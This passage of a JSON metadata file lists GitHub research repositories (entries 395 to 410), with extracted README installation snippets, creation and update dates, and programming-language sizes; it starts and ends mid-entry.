                    "original_header": "5. Maven Artifacts"
                },
                "confidence": 0.9999999999992042,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/arminmoin/ML-Quadrat/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Please watch our video here: https://www.youtube.com/watch?v=VAuz25w0a5k** \n"
                },
                "confidence": 0.9877119711931774,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/arminmoin/ML-Quadrat/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-16T07:40:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-01T11:17:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 4103178
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 240957
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Xtend",
                    "name": "Xtend",
                    "type": "Programming_language",
                    "size": 117599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 36986
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 15853
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 14853
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3642
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2052
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1968
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 329
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "395": {
        "filename": "Ostrzyciel_ontology-quality-2022_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Ostrzyciel/ontology-quality-2022",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-14T14:43:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-11T19:35:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 158765
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3196
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "396": {
        "filename": "microsoft_PythonProgrammingPuzzles_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/PythonProgrammingPuzzles",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft \ntrademarks or logos is subject to and must follow \n[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).\nUse of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.\nAny use of third-party trademarks or logos are subject to those third-party's policies. \n",
                    "original_header": "Trademarks"
                },
                "confidence": 0.9988852287322683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/PythonProgrammingPuzzles/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-25T21:05:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T23:10:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 902526
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 77844
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 21153
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "397": {
        "filename": "euro-hpc-pl_omnisolver-pt_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/euro-hpc-pl/omnisolver-pt",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install the plugin run:\n\n```shell\npip install omnisolver-pt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/euro-hpc-pl/omnisolver-pt/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-06-25T08:57:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-12T00:19:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 53250
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "398": {
        "filename": "UPHF_kotlin_features_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UPCArtifacts/kotlin_features",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-07-04T12:45:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-06T08:43:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 1831736
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 23353
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "399": {
        "filename": "bears-bugs_bears-benchmark_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bears-bugs/bears-benchmark",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following 17 bugs can also be reproduced with Java 11: Bears-150, Bears-179, Bears-194, Bears-206, Bears-207, Bears-211, Bears-212, Bears-220, Bears-225, Bears-231, Bears-232, Bears-236, Bears-238, Bears-240, Bears-242, Bears-246, Bears-250\n \n",
                    "original_header": "Java 11"
                },
                "confidence": 0.9716585330165063,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bears-bugs/bears-benchmark/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-10-11T16:54:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-04T07:08:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 7559
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "400": {
        "filename": "BYU-SE_quartermaster_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/BYU-SE/quartermaster",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To explore and develop locally, you can clone this repository. Then, run `npm i` to install dependencies. This provides the examples and Typescript source code in an easy to consume format.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Quartermaster"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/BYU-SE/quartermaster/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You don't need to code your entire system up in Quartermaster to use it. Quartermaster comes with a set of prebuilt components and techniques that are easily configured. If they don't cover all of your requirements, we've provided examples to help build whatever you need. \n",
                    "original_header": "Prebuilt Techniques"
                },
                "confidence": 0.9999880669378772,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/BYU-SE/quartermaster/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Tests can be run with `npm test`. \n",
                    "original_header": "Tests"
                },
                "confidence": 0.9909902281107499,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/BYU-SE/quartermaster/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-12T17:58:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-09T20:23:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 83001
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 6429
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "401": {
        "filename": "umairzahmed_tegcer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/umairzahmed/tegcer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "`sudo apt install clang python-pip python-tk unzip`\n",
                    "type": "Text_excerpt",
                    "original_header": "Ubuntu/Debian packages",
                    "parent_header": [
                        "TEGCER: Targeted Example Generation for Compilation ERrors",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/umairzahmed/tegcer/master/README.md"
            },
            {
                "result": {
                    "value": "`unzip -d ./data/input/ ./data/input/dataset.zip`\n",
                    "type": "Text_excerpt",
                    "original_header": "Extract dataset",
                    "parent_header": [
                        "TEGCER: Targeted Example Generation for Compilation ERrors",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/umairzahmed/tegcer/master/README.md"
            },
            {
                "result": {
                    "value": "`pip install --version requirements.txt`\n",
                    "type": "Text_excerpt",
                    "original_header": "Python packages",
                    "parent_header": [
                        "TEGCER: Targeted Example Generation for Compilation ERrors",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/umairzahmed/tegcer/master/README.md"
            },
            {
                "result": {
                    "value": "1. Create symbolic link to enable Python-Clang bind\n    ```\n    cd /usr/lib/x86_64-linux-gnu/\n    sudo ln -s libclang-XX.YY.so.1 libclang.so\n    ```\n\n    Where, `XX.YY` is the version number of Clang installed on your system.\n\n2. Set the `pathClangLib` variable in `./src/Base/ConfigFile.py`, to reflect the valid path to your Clang installation's header files directory.\n    ```\n    pathClangLib = \"/usr/lib/clang/XX.YY/include\" \n    ```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Set Clang paths",
                    "parent_header": [
                        "TEGCER: Targeted Example Generation for Compilation ERrors",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/umairzahmed/tegcer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-09-16T07:16:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-14T03:11:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 84669
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 150
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "402": {
        "filename": "FatemehAB_POLIS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FatemehAB/POLIS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install and set up the project, follow these steps:\n\n1. Clone the repository:\n\n   ```bash\n   git clone https://github.com/FatemehAB/POLIS.git\n   cd POLIS\n   ```\n\n2. Set up a virtual environment using Python 3.7 and install the required dependencies:\n   ```bash\n   python3.7 -m venv venv\n   source venv/bin/activate\n   pip install -r requirements.txt\n   ```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "POLIS: Program Optimization with Local Search"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FatemehAB/POLIS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-16T02:53:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-04T05:41:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1027100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "403": {
        "filename": "Jinxhy_AppAIsecurity_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Jinxhy/AppAIsecurity",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "For each selected model, according to its functionality, we manually find 10 random images from the Internet as the original input. Fig 7 shows the details of the dataset for one of the selected models.\n<p align=\"center\">\n  <img  src=\"figures/model_input.png\" width=\"100%\" height=\"100%\"><br/>\n  <em>Fig. 7. The original input for mobilenet.letgo.v1 1.0 224 quant.v7.tflite</em>\n</p>\n",
                    "type": "Text_excerpt",
                    "original_header": "DATASET PREPARING",
                    "parent_header": [
                        "Robustness of on-device Models: AdversarialAttack to Deep Learning Models on Android Apps",
                        "RQ3: HOW ROBUST ARE FINE-TUNED TFLITE MODELS AGAINST ADVERSARIAL ATTACKS?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Jinxhy/AppAIsecurity/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-18T15:44:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-10T06:20:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 14677
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "404": {
        "filename": "JohnnyPeng18_TypeFix_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JohnnyPeng18/TypeFix",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npython fix_miner.py\n```\n\nThe above command will start the fix template mining process based on the collected `final_combined_commits.json`. This process generally takes several hours and require at least 128GB RAM. It will generate a file `large_mined_templates.json` that contains all mined fix templates.\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Mining Fix Template",
                    "parent_header": [
                        "TypeFix",
                        "Code"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/TypeFix/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can run the above two function calls in `evaluate.py` to generate test scripts and then follow the instructions in [PyTER](https://github.com/kupl/PyTER/blob/main/INSTALL.md) to build dockers and run test cases. Patches that pass all the test cases are considered plausible patches. \n",
                    "original_header": "Step 4: Validating Candidate Patches"
                },
                "confidence": 0.9781401257781973,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/TypeFix/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-06T12:57:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T03:31:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 24643896
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 28201
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "405": {
        "filename": "chains-project_ethereum-ssc_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/chains-project/ethereum-ssc",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-10-14T06:31:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-03T10:50:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 46801594
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 5149596
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 80153
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 66641
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 45749
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 28690
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 17698
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10434
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Groovy",
                    "name": "Groovy",
                    "type": "Programming_language",
                    "size": 4048
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "406": {
        "filename": "ifak-prototypes_nlp_reform_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ifak-prototypes/nlp_reform",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-02-28T08:28:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-10-26T13:41:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 182544
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 3385
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1352
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "407": {
        "filename": "salesforce_PyRCA_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/salesforce/PyRCA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can install ``pyrca`` from PyPI by calling ``pip install sfr-pyrca``. You may install from source by\ncloning the PyRCA repo, navigating to the root directory, and calling\n``pip install .``, or ``pip install -e .`` to install in editable mode. You may install additional dependencies:\n\n- **For plotting & visualization**: Calling ``pip install sfr-pyrca[plot]``, or ``pip install .[plot]`` from the\n  root directory of the repo.\n- **Install all the dependencies**: Calling ``pip install sfr-pyrca[all]``, or ``pip install .[all]`` from the\n  root directory of the repo.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "PyRCA: A Python library for Root Cause Analysis"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/salesforce/PyRCA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<div align=\"center\">\n  <a href=\"#\">\n  <img src=\"https://img.shields.io/badge/Python-3.7, 3.8, 3.9-blue\">\n  </a>\n  <a href=\"https://pypi.python.org/pypi/sfr-pyrca\">\n  <img alt=\"PyPI\" src=\"https://img.shields.io/pypi/v/sfr-pyrca.svg\"/>\n  </a>\n  <a href=\"https://opensource.salesforce.com/PyRCA/\">\n  <img alt=\"Documentation\" src=\"https://github.com/salesforce/PyRCA/actions/workflows/docs.yml/badge.svg\"/>\n  </a>\n  <a href=\"https://pepy.tech/project/sfr-pyrca\">\n  <img alt=\"Downloads\" src=\"https://static.pepy.tech/badge/sfr-pyrca\">\n  </a>\n  <a href=\"https://arxiv.org/abs/2306.11417\">\n  <img alt=\"DOI\" src=\"https://zenodo.org/badge/DOI/10.48550/ARXIV.2306.11417.svg\"/>\n  </a>\n</div>\n \n",
                    "original_header": "PyRCA: A Python library for Root Cause Analysis"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/salesforce/PyRCA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|                             |  Recall@1   |  Recall@3   |  Recall@5   |\n:---------------------------:|:-----------:|:-----------:|:-----------:\n|         \u03b5-Diagnosis         | 0.06 \u00b1 0.02 | 0.16 \u00b1 0.04 | 0.16 \u00b1 0.04 |\n|             RCD             | 0.28 \u00b1 0.05 | 0.29 \u00b1 0.05 | 0.30 \u00b1 0.05 |\n|          Local-RCD          | 0.44 \u00b1 0.05 | 0.70 \u00b1 0.05 | 0.70 \u00b1 0.05 |\n|         Random Walk         | 0.07 \u00b1 0.03 | 0.20 \u00b1 0.04 | 0.24 \u00b1 0.04 |\n|      Random Walk (PC)       | 0.06 \u00b1 0.02 | 0.17 \u00b1 0.04 | 0.21 \u00b1 0.04 |\n|     Bayesian Inference      | 0.15 \u00b1 0.04 | 0.35 \u00b1 0.05 | 0.43 \u00b1 0.05 |\n|   Bayesian Inference (PC)   | 0.11 \u00b1 0.03 | 0.30 \u00b1 0.05 | 0.40 \u00b1 0.05 |\n|     Hypothesis-testing      | 1.00 \u00b1 0.00 | 1.00 \u00b1 0.00 | 1.00 \u00b1 0.00 |\n|   Hypothesis-testing (PC)   | 0.95 \u00b1 0.02 | 1.00 \u00b1 0.00 | 1.00 \u00b1 0.00 |\n|  Hypothesis-testing (ADJ)   | 0.95 \u00b1 0.02 | 1.00 \u00b1 0.00 | 1.00 \u00b1 0.00 |\n| Hypothesis-testing (ADJ-PC) | 0.77 \u00b1 0.04 | 0.92 \u00b1 0.03 | 0.92 \u00b1 0.03 | \n",
                    "original_header": "Benchmarks"
                },
                "confidence": 0.9999999628683447,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/salesforce/PyRCA/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-24T07:57:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T05:50:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 220086
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 15872
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 292
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "408": {
        "filename": "kahrabian_RT-X_2024-10-04.json",
        "code_repository": "No code repository found.",
        "installation_instructions": "No installation instructions found.",
        "date_created": "No date_created found.",
        "date_updated": "No date_updated found.",
        "programming_languages": "No programming languages found."
    },
    "409": {
        "filename": "coco-2023_COCO_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/coco-2023/COCO",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-25T10:58:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-25T10:58:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "410": {
        "filename": "nokia_codesearch_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/nokia/codesearch",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Install the codesearch library: `pip install .`\n2. Install the tree-sitter parsers (for preprocessing the code snippets): e.g., `codesearch install_parsers python java` or simply `codesearch install_parsers` to install parsers for all supported languages. By default, parsers are installed under the `codesearch/parsers` directory this can be customized by setting the `TREE_SITTER_DIR` variable.\n3. Install spacy (for preprocessing descriptions/code comments): `python -m spacy download en_core_web_md`\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Code search"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/nokia/codesearch/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| name                                          | description                                                                                                                  |\n|-----------------------------------------------|------------------------------------------------------------------------------------------------------------------------------|\n| so-ds-feb20                                   | Mined from Python Stack Overflow posts related to data science. Stack Overflow dumps can be found here: https://archive.org/details/stackexchange, [LICENSE](https://creativecommons.org/licenses/by-sa/4.0/)                                                             |\n| staqc-py-cleaned                     | Derived from the Python StaQC snippets (additional cleaning was done as decribed in the paper). See https://github.com/LittleYUYU/StackOverflow-Question-Code-Dataset, [LICENSE](https://github.com/LittleYUYU/StackOverflow-Question-Code-Dataset/blob/master/LICENSE.txt)                               |\n| conala-curated                                | Derived from the curated snippets of the CoNaLa benchmark. See https://conala-corpus.github.io/ , [LICENSE](https://creativecommons.org/licenses/by-sa/4.0/)                                                                                         |\n| codesearchnet-{language}-{train\\|valid\\|test} | The CodeSearchNet snippet collections used for training/MRR validation/MRR testing. See https://github.com/github/CodeSearchNet. Licenses of the individial snippets can be found in pkl files.                                           |\n| codesearchnet-{language}                      | The CodeSearchNet snippet collections used for the weights and biases benchmark. See https://github.com/github/CodeSearchNet. Licenses 